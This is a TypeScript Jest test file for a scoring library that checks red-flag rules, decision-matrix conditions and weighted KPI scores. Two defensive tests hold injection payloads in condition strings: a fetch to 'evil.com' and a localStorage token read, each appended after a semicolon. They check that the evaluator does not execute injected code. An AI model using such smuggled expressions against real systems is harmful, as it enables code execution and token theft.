import {
  evaluateRedFlags,
  evaluateDecisionMatrix,
  calculateSectionScore,
  calculateOverallScore,
  validateScoringSubmission,
  KPI,
  SectionScore
} from '../lib/scoring';
import { RedFlag, DecisionMatrix } from '../types';

describe('Scoring – Safe Evaluation (No eval)', () => {
  const redFlags: RedFlag[] = [
    {
      id: 'rf1',
      templateId: 't1',
      condition: 'score > 80',
      alertMessage: 'Score too high!',
    },
    {
      id: 'rf2',
      templateId: 't1',
      condition: 'score < 30',
      alertMessage: 'Score too low!',
    },
  ];

  const matrix: DecisionMatrix[] = [
    {
      id: 'dm1',
      templateId: 't1',
      condition: 'score >= 75',
      recommendation: 'Advance',
    },
    {
      id: 'dm2',
      templateId: 't1',
      condition: 'score >= 40 && score < 75',
      recommendation: 'Consider',
    },
    {
      id: 'dm3',
      templateId: 't1',
      condition: 'score < 40',
      recommendation: 'Reject',
    },
  ];

  test('evaluates simple comparisons correctly', () => {
    const triggered = evaluateRedFlags(redFlags, 85);
    expect(triggered).toHaveLength(1);
    expect(triggered[0].id).toBe('rf1');
  });

  test('evaluates AND conditions correctly', () => {
    const result = evaluateDecisionMatrix(matrix, 60);
    expect(result).not.toBeNull();
    expect(result?.id).toBe('dm2');
    expect(result?.recommendation).toBe('Consider');
  });

  test('evaluates OR conditions correctly', () => {
    const customMatrix: DecisionMatrix[] = [
      {
        id: 'dm4',
        templateId: 't1',
        condition: 'score < 30 || score > 90',
        recommendation: 'Edge case',
      },
    ];
    const result = evaluateDecisionMatrix(customMatrix, 95);
    expect(result).not.toBeNull();
    expect(result?.id).toBe('dm4');
  });

  test('returns null when no condition matches', () => {
    const customMatrix: DecisionMatrix[] = [
      {
        id: 'dm_high',
        templateId: 't1',
        condition: 'score > 90',
        recommendation: 'Advance',
      }
    ];
    const result = evaluateDecisionMatrix(customMatrix, 50);
    expect(result).toBeNull();
  });

  test('handles invalid conditions gracefully', () => {
    const invalidFlags: RedFlag[] = [
      {
        id: 'rf3',
        templateId: 't1',
        condition: 'score > 50; fetch("https://evil.com")', // Malicious
        alertMessage: 'Malicious condition',
      },
    ];
    const triggered = evaluateRedFlags(invalidFlags, 60);
    expect(triggered).toHaveLength(0); // Should not execute malicious code
  });

  test('prevents code injection via admin-editable conditions', () => {
    const maliciousFlag: RedFlag = {
      id: 'rf4',
      templateId: 't1',
      condition: 'score > 50; localStorage.getItem("token")', // Would steal token
      alertMessage: 'Malicious',
    };
    // This should NOT execute the second part
    const triggered = evaluateRedFlags([maliciousFlag], 60);
    expect(triggered).toHaveLength(0);
  });

  describe('Scoring Validation and Error Handling', () => {
    const sampleKPIs: KPI[] = [
      { id: 'k1', label: 'Communication', weight: 0.5 },
      { id: 'k2', label: 'Technical Skills', weight: 0.5 },
    ];

    const sampleTemplateSections = [
      {
        id: 'sec1',
        weight: 0.6,
        kpis: sampleKPIs,
      },
      {
        id: 'sec2',
        weight: 0.4,
        kpis: [
          { id: 'k3', label: 'Problem Solving', weight: 1.0 },
        ],
      }
    ];

    test('calculateSectionScore calculates correct weighted score for valid inputs', () => {
      const scores = { k1: 8, k2: 9 };
      const result = calculateSectionScore(sampleKPIs, scores, 'sec1');
      expect(result.score).toBe(8.5);
      expect(result.errors).toHaveLength(0);
      expect(result.warnings).toHaveLength(0);
    });

    test('calculateSectionScore fails on unknown KPI IDs', () => {
      const scores = { k1: 8, k2: 9, k_unknown: 10 };
      const result = calculateSectionScore(sampleKPIs, scores, 'sec1');
      expect(result.score).toBe(0);
      expect(result.errors).toContain('Unknown KPIs in section sec1: k_unknown');
    });

    test('calculateSectionScore fails on missing required KPIs', () => {
      const scores = { k1: 8 }; // k2 is missing
      const result = calculateSectionScore(sampleKPIs, scores, 'sec1');
      expect(result.score).toBe(0);
      expect(result.errors).toContain('Missing required KPIs for section sec1: k2');
    });

    test('calculateSectionScore warns if weights do not sum to 1', () => {
      const badKPIs: KPI[] = [
        { id: 'k1', label: 'Communication', weight: 0.4 },
        { id: 'k2', label: 'Technical Skills', weight: 0.4 },
      ];
      const scores = { k1: 8, k2: 9 };
      const result = calculateSectionScore(badKPIs, scores, 'sec1');
      expect(result.score).toBe(3.2 + 3.6); // 6.8
      expect(result.warnings).toContain('Section sec1 weights sum to 80% (expected 100%)');
      expect(result.errors).toHaveLength(0);
    });

    test('calculateOverallScore calculates correct weighted overall score', () => {
      const submittedSections: SectionScore[] = [
        {
          sectionId: 'sec1',
          sectionName: 'Performance',
          kpiScores: { k1: 8, k2: 10 },
          weight: 0.6,
        },
        {
          sectionId: 'sec2',
          sectionName: 'Core Values',
          kpiScores: { k3: 7 },
          weight: 0.4,
        }
      ];

      const result = calculateOverallScore(submittedSections, sampleTemplateSections);
      // sec1 score = 8*0.5 + 10*0.5 = 9. sec1 weight = 0.6 => weighted = 5.4
      // sec2 score = 7*1.0 = 7. sec2 weight = 0.4 => weighted = 2.8
      // overall = 5.4 + 2.8 = 8.2
      expect(result.score).toBeCloseTo(8.2, 5);
      expect(result.errors).toHaveLength(0);
      expect(result.warnings).toHaveLength(0);
    });

    test('calculateOverallScore rejects partial submissions if isPartialAllowed is false', () => {
      const submittedSections: SectionScore[] = [
        {
          sectionId: 'sec1',
          sectionName: 'Performance',
          kpiScores: { k1: 8, k2: 10 },
          weight: 0.6,
        }
      ];

      const result = calculateOverallScore(submittedSections, sampleTemplateSections, false);
      expect(result.score).toBe(0);
      expect(result.errors).toContain('Missing sections: sec2');
    });

    test('calculateOverallScore allows partial submissions if isPartialAllowed is true', () => {
      const submittedSections: SectionScore[] = [
        {
          sectionId: 'sec1',
          sectionName: 'Performance',
          kpiScores: { k1: 8, k2: 10 },
          weight: 0.6,
        }
      ];

      const result = calculateOverallScore(submittedSections, sampleTemplateSections, true);
      // sec1 score = 9. weight = 0.6 => 5.4. sec2 weight is not in submittedSections so total section weights = 0.6
      expect(result.score).toBeCloseTo(5.4, 5);
      expect(result.warnings).toContain('Section weights sum to 60% (expected 100%)');
    });

    test('validateScoringSubmission reports errors and warnings correctly', () => {
      const submittedSections: SectionScore[] = [
        {
          sectionId: 'sec1',
          sectionName: 'Performance',
          kpiScores: { k1: 8 }, // missing k2
          weight: 0.5, // wrong section weight sum
        }
      ];

      const validation = validateScoringSubmission(submittedSections, sampleTemplateSections, false);
      expect(validation.valid).toBe(false);
      expect(validation.errors).toContain('Missing sections: sec2');
      expect(validation.errors).toContain('Missing required KPIs: k2');
      expect(validation.warnings).toContain('Section weights sum to 50% (expected 100%)');
    });
  });
});
